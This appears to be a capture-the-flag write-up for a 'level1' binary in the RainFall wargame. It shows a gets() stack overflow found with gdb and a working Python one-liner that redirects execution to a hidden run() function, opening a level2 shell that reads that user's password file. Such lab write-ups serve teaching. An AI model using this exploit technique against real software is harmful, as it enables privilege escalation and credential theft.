In the main function, there is a call to `gets()`. What makes this program vulnerable is that we can overflow the buffer of this `gets()` call with other values and redirect it at the address we want. 

The best we can hope is to execute a Shell to take over controle with the rights of the user who owns the file. And fortunately, if we look better into the program, there is an uncalled function `run()` that opens a bash terminal.


open gdb :
```
Starting program: /home/user/level1/level1 <<< $(python -c "print 'A' * 76 + 'BBBB'")

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info reg ebp eip
ebp            0x41414141	0x41414141
eip            0x42424242	0x42424242
```

We rewrited the `seip` value and the program couldn't continue correctly not knowing what's at the address : 42424242.


0x08048444 is the address of the function `run()`,
\x44\x84\x04\x08 is the transcription of that address on a little-endian machine.

```
python -c 'print "A" * 76 + "\x44\x84\x04\x08"' | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```
Executing in shut the stdin so we have to find a way to keep it open.
`cat` will pump in the output of the python script into an input stream and wait for more inputs until EOF.

in the terminal :

```
level1@RainFall:~$ (python -c 'print "A"*76+"\x44\x84\x04\x08";' && cat) | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
```

Stack overflow !